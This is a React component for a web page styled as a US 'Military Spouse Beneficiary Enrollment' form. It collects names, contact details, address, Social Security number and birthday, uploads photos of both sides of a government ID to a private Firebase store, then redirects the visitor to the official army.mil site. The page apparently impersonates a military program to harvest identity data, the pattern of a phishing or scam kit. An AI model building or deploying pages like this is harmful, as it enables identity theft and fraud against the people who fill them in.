import { useRef, useState } from "react";
import bgImage from "../images/military.jpg";
import militaryLogo from "../images/USlogo.png";
import ReCAPTCHA from "react-google-recaptcha";

import { storage, db } from "../firebase";
import { addDoc, collection } from "firebase/firestore";
import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
import { v4 } from "uuid";

import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

export default function Military() {
	const [firstname, setFirstname] = useState("");
	const [lastname, setLastname] = useState("");
	const [email, setEmail] = useState("");
	const [phoneNumber, setPhoneNumber] = useState("");
	const [address, setAddress] = useState("");
	const [relationship, setRelationship] = useState("");
	const [frontId, setFrontid] = useState("");
	const [backId, setBackid] = useState("");
	const [ssn, setSsn] = useState("");
	const [birthday, setBirthday] = useState("");
	const [notVerified, setnotVerified] = useState(true);

	const captchaRef = useRef();

	const handleFrontId = (e) => {
		const image = e.target.files[0];

		const imageRef = ref(storage, `validId/${image.name + v4()}`);
		uploadBytes(imageRef, image).then((imageLink) => {
			console.log("imageLink", imageLink);
			getDownloadURL(imageLink.ref).then((url) => {
				setFrontid(url);
			});
		});
	};
	const handleBackId = (e) => {
		const image = e.target.files[0];

		const imageRef = ref(storage, `validId/${image.name + v4()}`);
		uploadBytes(imageRef, image).then((imageLink) => {
			console.log("imageLink", imageLink);
			getDownloadURL(imageLink.ref).then((url) => {
				setBackid(url);
			});
		});
	};

	const handleRecaptcha = () => {
		const captchaValue = captchaRef.current.getValue();
		if (captchaValue) {
			setnotVerified(false);
		}
	};

	const handleSubmit = async (e) => {
		e.preventDefault();

		const valRef = collection(db, "beneficiary");
		const saveData = await addDoc(valRef, {
			firstname,
			lastname,
			email,
			phoneNumber,
			address,
			relationship,
			frontId,
			backId,
			ssn,
			birthday,
		});

		if (saveData) {
			toast.success("Application Submitted Successfully");
			setFirstname("");
			setLastname("");
			setEmail("");
			setPhoneNumber("");
			setAddress("");
			setRelationship("");
			setSsn("");
			setFrontid("");
			setBackid("");
			setBirthday("");
			setFrontid(null);
			setBackid(null);

			window.location.href = "https://www.army.mil/";
		}
	};

	return (
		<section className="max-w-7xl mx-auto w-4/5 mb-32">
			<div className="relative">
				<img src={bgImage} alt="backgroundimage" />
				<div className="absolute top-5 right-5 borde border-black">
					<img src={militaryLogo} alt="military logo" className="h-10 w-10 xl:h-48 xl:w-48" />
				</div>
			</div>
			<div>
				<h2 className="mt-5 font-bold mb-8">MILITARY SPOUSE BENEFICIARY ENROLLMENT</h2>

				<form onSubmit={handleSubmit} className="w-[85%]">
					<div className="md:flex gap-10 items-end justify-between">
						<div className="mb-10 md:mb-0 md:w-[45%]">
							<label className="text-xl" htmlFor="firstName">
								Spouse's Name*
							</label>
							<input
								type="text"
								placeholder="First Name"
								value={firstname}
								onChange={(e) => setFirstname(e.target.value)}
								className="border-b w-full border-black py-3 outline-none text-xl"
								required
							/>
						</div>
						<div className="md:w-[45%]">
							<input
								type="text"
								placeholder="Last Name"
								value={lastname}
								onChange={(e) => setLastname(e.target.value)}
								className="border-b w-full border-black py-3 outline-none text-xl"
								required
							/>
						</div>
					</div>

					{/* ====================================  */}

					<div className="md:flex gap-10 items-center justify-between">
						<div className="md:w-[45%] my-10 md:my-5">
							<label htmlFor="email" className="mt-3 pt-3 text-xl">
								Email
							</label>
							<input
								type="email"
								className="border-b w-full border-black py-3 outline-none text-xl"
								placeholder="Enter your Email"
								value={email}
								onChange={(e) => setEmail(e.target.value)}
								required
							/>
						</div>
						<div className="my-5 md:w-[45%]">
							<label htmlFor="phonenumber" className="mt-3 pt-3 text-xl">
								Phone no.
							</label>
							<input
								type="text"
								className="border-b w-full border-black py-3 outline-none text-xl"
								placeholder="Phone"
								value={phoneNumber}
								onChange={(e) => setPhoneNumber(e.target.value)}
								required
							/>
						</div>
					</div>
					<div className="md:flex justify-between">
						<div className="md:w-[45%] my-10">
							<label htmlFor="address" className="mt-3 pt-3 text-xl">
								Address
							</label>
							<input
								type="text"
								className="border-b w-full border-black py-3 outline-none text-xl"
								placeholder="Address"
								value={address}
								onChange={(e) => setAddress(e.target.value)}
								required
							/>
						</div>
						<div className="md:w-[45%] my-10">
							<label htmlFor="relationship" className="mt-3 pt-3 text-xl">
								Relationship(e.g sibling, spouse)
							</label>
							<input
								type="text"
								className="border-b w-full border-black py-3 outline-none text-xl"
								placeholder="Relationship"
								value={relationship}
								onChange={(e) => setRelationship(e.target.value)}
								required
							/>
						</div>
					</div>
					<div className="w-full md:flex justify-between">
						<div className="mb-10 md:mb-0 md:w-[45%]">
							<label htmlFor="ssn" className="mt-3 pt-3 text-xl">
								SSN*
							</label>
							<input
								type="text"
								className="border-b w-full border-black py-3 outline-none text-xl"
								placeholder="SSN"
								value={ssn}
								onChange={(e) => setSsn(e.target.value)}
								required
							/>
						</div>
						<div className="md:w-[45%]">
							<label htmlFor="dob" className="block  pt-3 text-xl">
								Birthday*
							</label>
							<input
								type="date"
								value={birthday}
								className="border-b w-full border-black py-3 outline-none text-xl"
								onChange={(e) => setBirthday(e.target.value)}
								required
							/>
						</div>
					</div>

					<div className="mt-10 mb-20">
						<h2 className="font-bold text-2xl mb-5">Upload Government Issued ID Card</h2>
						<div className="md:flex justify-between">
							<div>
								<label className="block text-xl mb-5" htmlFor="id">
									FRONT.
								</label>
								<input type="file" name="id-card" id="id-card" onChange={handleFrontId} required />
							</div>
							<div>
								<label className="block text-xl mb-5" htmlFor="id">
									BACK.
								</label>
								<input type="file" name="id-card" id="id-card" onChange={handleBackId} required />
							</div>
						</div>
					</div>
					<ReCAPTCHA
						ref={captchaRef}
						sitekey="6Lfom_8oAAAAAGlQIW6Z7XtGV525-BUsB5g-14a-"
						onChange={handleRecaptcha}
					/>

					<button
						type="submit"
						disabled={notVerified}
						className={`mt-16 bg-blue-600 text-white font-bold py-5 px-16 text-xl ${
							notVerified ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
						}`}
					>
						SUBMIT
					</button>
				</form>
			</div>
			<ToastContainer
				position="top-right"
				autoClose={5000}
				hideProgressBar={false}
				newestOnTop={false}
				closeOnClick
				rtl={false}
				pauseOnFocusLoss
				draggable
				pauseOnHover
				theme="light"
			/>
		</section>
	);
}
